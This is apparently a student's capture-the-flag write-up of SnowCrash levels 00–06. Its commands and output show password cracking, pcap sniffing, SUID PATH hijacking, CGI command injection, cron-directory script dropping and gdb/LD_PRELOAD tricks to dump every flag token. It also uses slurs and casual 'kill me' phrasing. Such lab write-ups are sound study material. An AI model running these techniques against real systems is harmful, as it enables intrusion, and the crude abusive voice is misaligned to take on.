# snowcrash, why am I doing this to myself
This is supposed to be some introductory project to cybersecurity.
#### random shit I found
```
level00@SnowCrash:~$ users
level00 level00
```
there are no fucking files, don't know where the fuck to start this retarded shit
```
level00@SnowCrash:~$ps -U level00
  PID TTY          TIME CMD
 1935 tty1     00:00:00 bash
 2194 ?        00:00:00 sshd
 2195 pts/0    00:00:00 bash
 2314 pts/0    00:00:00 ps
```
*no weird processes noted by this fucking stupid user*
```
level00@SnowCrash:~$find / -user level00 -type f 2> /dev/null
```
*what the fuck, endless fucking files, kill me*
So I was looking for the wrong user, apparently flag00 is a fucking user
```
find / -group flag00 2>/dev/null
```
## file found for flag00, /usr/sbin/john
containing
```
cdiiddwpgswtgt
```
looks like a cypher, but which one, kill me

using this baby **https://www.boxentriq.com/code-breaking/cipher-identifier**
detected **Bifid Cipher**, tried decyphering, nothing, fucking retarded detector

### trying Caesar Cipher cuz it's the second recommend
outputs: nottoohardhere
```
level00@SnowCrash:~$ su flag00
Password: 
Don't forget to launch getflag !
flag00@SnowCrash:~$ getflag
Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
```
## level01
Of course this bullshit is empty again
### stupid blind enumeration commands
```
env
```
*show all env variables, nothing fucking interesting*
```
sudo -l
```
*display all sudo info for current user, asks for the fucking password, kill me*
```
find / -perm /6000 2>/dev/null;
```
*shows all SUID and SGID files, nothing interesting to note*
```
cat /etc/shadow
```
*perm denied*
```
cat /etc/passwd
```
*listing users in the system*
Shows user flag01
```
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```
fucking kill me, need to crack the passwd file, googled of course, **John the Ripper**, and yay, can't use it on the retarded Snowcrash machine

**tried to fucking use docker but the fucking retarded mac is fucking retarded, KILL ME**
Using google cloud, john installed, need to send the passwd file
```
scp -P 4242 level01@10.12.100.115:/etc/passwd .
```
Nothing connection timed out, kill me, copied the passwd file, download wordlist from **https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Software/john-the-ripper.txt**
```
~$ /usr/sbin/john --wordlist=wordlist.txt passwd
$ /usr/sbin/john --show passwd 
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash
1 password hash cracked, 0 left
```
*tada*
```
su flag01
Password:abcdefg
Don't forget to launch getflag !
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
flag01@SnowCrash:~$ su level02
Password:f2av5il02puano7naaf6adaaf
```
## level02
#### tshark, I think?
```
scp -P 4242 level02@10.12.100.115:/home/user/level02/level02.pcap .
```
Using tshark to open capture file, found
```
0000   00 24 1d 0f 00 ad 08 00 27 cc 8a 1e 08 00 45 00   .$......'.....E.
0010   00 41 d4 b3 40 00 40 06 16 77 3b e9 eb df 3b e9   .A..@.@..w;...;.
0020   eb da 2f 59 99 4f ba a8 fb 18 9d 18 15 7b 80 18   ../Y.O.......{..
0030   01 c5 27 9d 00 00 01 01 08 0a 02 c2 3c 62 01 1b   ..'.........<b..
0040   b9 87 00 0d 0a 50 61 73 73 77 6f 72 64 3a 20      .....Password: 
```
*at No 43*

reading the following lines` Data :
```
66 74 5f 77 61 6e 64 72 7f 7f 7f 4e 44 52 65 6c 7f 4c
```
Using hex to ascii, **ft_wandrNDRelL**, authentication failure, I guess i have missed the last hex
```
66 74 5f 77 61 6e 64 72 7f 7f 7f 4e 44 52 65 6c 7f 4c 30 4c
```
**ft_wandrNDRelL0L**
```
su flag02
Password: ft_wandrNDRelL0L
Don't forget to launch getflag !
flag02@SnowCrash:~$ getflag
Check flag.Here is your token : kooda2puivaav1idi4f57q8iq
flag02@SnowCrash:~$ su level03
Password:kooda2puivaav1idi4f57q8iq
```
## level03
#### exploitme
```
level03@SnowCrash:~$ ls -al
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```
*executable has SUID permission, **When you execute a program that has the SUID bit enabled, you inherit the permissions of that program's owner***

Using **binary ninja**
```
mov     dword [esp], data_80485e0  {"/usr/bin/env echo Exploit me"}
```
*create symbolic link of echo that runs getflag, of course permission denied, so i used /tmp*
```
level03@SnowCrash:~$ln -s /bin/getflag /tmp/echo
level03@SnowCrash:~$ export PATH=.:$PATH
level03@SnowCrash:/tmp$ ./level03
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
```
*Fucking kill me*
#### I'm a fucking idiot retard, PATH should be PATH=/tmp:$PATH
```
level03@SnowCrash:~$ export PATH=/tmp:$PATH
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$ su level04
Password:qi0maab88jeaj46qoumi7maus
```
## level04, fucking perl
Executing it doesn't print shit, tried editing after copying file to /tmp, file has SUID permission

After googling *GCI*, **In Perl, CGI(Common Gateway Interface) is a protocol for executing scripts via web requests.**
```
$curl http://10.12.100.115:4747/\?x\=blah
blah
```
*using the x param, curl prints whatever is passed to it in x=*
```
curl http://10.12.100.115:4747/\?x\=$\(getflag\)
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
level04@SnowCrash:~$ su level05
Password:ne2searoevaevoem4ov4ar8ap
```
## Attempt to reverse /bin/getflag, because I need to do Minirt 
Using **binary ninja**
```
mov     dword [esp {var_130}], data_8048fa8  {"You should not reverse this"} 
```
*fuck you, i do what I waant fucking fascist*

The binary calls getuid, the returned UID is in eax
```
call  getuid
```
*GETUID returns the real user ID of the calling process*
#### trying to override uid
```
(gdb) b getuid
Breakpoint 2 at 0xb7ee4cc0
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /bin/getflag 

Breakpoint 1, 0x0804894a in main ()
(gdb) c
Continuing.
You should not reverse this
```
*debugging is blocked by ptrace()*
```
call    ptrace
```
Hijacking te ptrace() function using LD_PRELOAD
*created file /tmp/ptrace.c*
```
long ptrace(int request, int pid, int addr, int data)
{
     return 0;
}
```
*created fake library
```
level05@SnowCrash:/tmp$ gcc /tmp/ptrace.c -o /tmp/ptrace.so -fPIC -shared -ldl -D_GNU_SOURCE
level05@SnowCrash:/tmp$ export LD_PRELOAD=/tmp/ptrace.so
```
gdb
```
b getuid
Breakpoint 1 at 0x80484b0
(gdb) r
Starting program: /bin/getflag 
Injection Linked lib detected exit..
During startup program exited with code 1.
```
*Bad fucking idea*
#### disassemble main
Executable calls an ft_dec and then fputs, I suspect it's the lines that print the flag
```
0x08048c01 <+699>:   call   0x8048604 <ft_des>
0x08048c06 <+704>:   mov    %ebx,0x4(%esp)
0x08048c0a <+708>:   mov    %eax,(%esp)
0x08048c0d <+711>:   call   0x8048530 <fputs@plt>
```
break in main then in **jns     0x80489a8** which is at addr **0x08048990**, because jumping straight to the address after the puts segfaults
```
(gdb) b main 
Breakpoint 1 at 0x804894a
(gdb) b *0x08048990
Breakpoint 2 at 0x8048990
(gdb) r
Starting program: /bin/getflag 

Breakpoint 1, 0x0804894a in main ()
(gdb) c
Continuing.

Breakpoint 2, 0x08048990 in main ()
```
try first jumping to the first address after return from fputs
```
(gdb) jump *0x08048c17
Continuing at 0x8048c17.
f2av5il02puano7naaf6adaaf
[Inferior 1 (process 2345) exited normally]
```
*this is the level02 password*
```
(gdb) jump *0x08048c3b
Continuing at 0x8048c3b.
kooda2puivaav1idi4f57q8iq
[Inferior 1 (process 2365) exited normally]
```
*flag for level03*
```
(gdb) jump *0x08048c5f
Continuing at 0x8048c5f.
qi0maab88jeaj46qoumi7maus
[Inferior 1 (process 2374) exited normally]
```
*level04*
```
(gdb) jump *0x08048c83
Continuing at 0x8048c83.
ne2searoevaevoem4ov4ar8ap
[Inferior 1 (process 2375) exited normally]
```
*level05*
```
(gdb) jump *0x08048ca7
Continuing at 0x8048ca7.
viuaaale9huek52boumoomioc
[Inferior 1 (process 2382) exited normally]
```
**all I wanted was this flaaaag for level06**
```
(gdb) jump *0x08048ccb
Continuing at 0x8048ccb.
wiok45aaoguiboiki2tuin6ub
[Inferior 1 (process 2519) exited normally]
```
*level07*
```
(gdb) jump *0x08048cef
Continuing at 0x8048cef.
fiumuikeil55xe9cu4dood66h
[Inferior 1 (process 2526) exited normally]
```
*level08*
```
(gdb) jump *0x08048d13
Continuing at 0x8048d13.
25749xKZ8L7DkSCwJkT9dyv6f
[Inferior 1 (process 2527) exited normally]
```
*level09*
```
(gdb) jump *0x08048d37
Continuing at 0x8048d37.
s5cAJpM8ev6XHw998pRWG728z
[Inferior 1 (process 2631) exited normally]
```
*level10*
```
(gdb) jump *0x08048d5b
Continuing at 0x8048d5b.
feulo4b72j7edeahuete3no7c
[Inferior 1 (process 2638) exited normally]
```
*level11*
```
(gdb) jump *0x08048d7f
Continuing at 0x8048d7f.
fa6v5ateaw21peobuub8ipe6s
[Inferior 1 (process 2639) exited normally]
```
*level12*
```
(gdb) jump *0x08048da3
Continuing at 0x8048da3.
g1qKMiRpXf53AWhDaU7FEkczr
[Inferior 1 (process 2656) exited normally]
```
*level13*
```
(gdb) jump *0x08048dc4
Continuing at 0x8048dc4.
2A31L79asukciNyi8uppkEuSx
[Inferior 1 (process 2721) exited normally]
```
*level14*

## RE level05, been told you SHOULDN'T REVERSE /bin/getflag, who the fuck comes up with these rules
Again fucking empty working directory
```
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
```
*stupid directories and files I dgaf*
```
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```
the first is a file containing a script
```
level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```
*no special permissions mo SUID, guess I'll die*
```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
Second is a file as well can't open it
```
level05@SnowCrash:~$ ls -l /rofs/usr/sbin/openarenaserver
-rwxr-x--- 1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
level05@SnowCrash:~$ cat /rofs/usr/sbin/openarenaserver
cat: /rofs/usr/sbin/openarenaserver: Permission denied
```
### the stupid script
loops on files in **/opt/openarenaserver/**, sets ulimit to 5 and executes them then deletes files

*ulimit -t 5: this shit sets a timer of 5 seconds on allowed time to execute process, if time is 'dépassé', dk what the word is, then process is terminated or killed*

*bash -x: executes .sh files*

After many attempts to create a file a.sh in /opt/openarenaserver/ containing the **getflag**, and executing the script, token still empty, and file is deleted, I guess **because the script is executed with the user's permissions, and not the owner's, nothing special happens, It's the same as executing getflag myself from the terminal**

*However, this challenge can't be this fucking retarded, to give a script with no fucking special permissions how the fuck am I supposed to do anything with it.*

```
level05@SnowCrash:~$ps -ef
```
*attempt to see if a process with higher permissions could execute this in the background, nothing*

#### little experiment
Created a file inside /opt/openarenaserver/, empty file, and waited to see if it will be deleted

After a while **IT DID**, so recreated file a.sh with getflag inside and redirected the getflag output to  file in /tmp, just to save output before files get deleted
```
level05@SnowCrash:~$ touch /opt/openarenaserver/a.sh
level05@SnowCrash:~$ echo "getflag > /tmp/a" > /opt/openarenaserver/a.sh
level05@SnowCrash:~$ cd /opt/openarenaserver/
level05@SnowCrash:/opt/openarenaserver$ ls
level05@SnowCrash:/opt/openarenaserver$ ls
level05@SnowCrash:/opt/openarenaserver$ cat /tmp/a
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
*after a while file was delleted, and there's the flaaaaaag*
```
level05@SnowCrash:/opt/openarenaserver$ su level06
Password:viuaaale9huek52boumoomioc
```
*I'm still depressed*
## level06 a.k.a I swear I'm gonna get kicked out
**UGH PHP**
Fuck php, wtf, kill me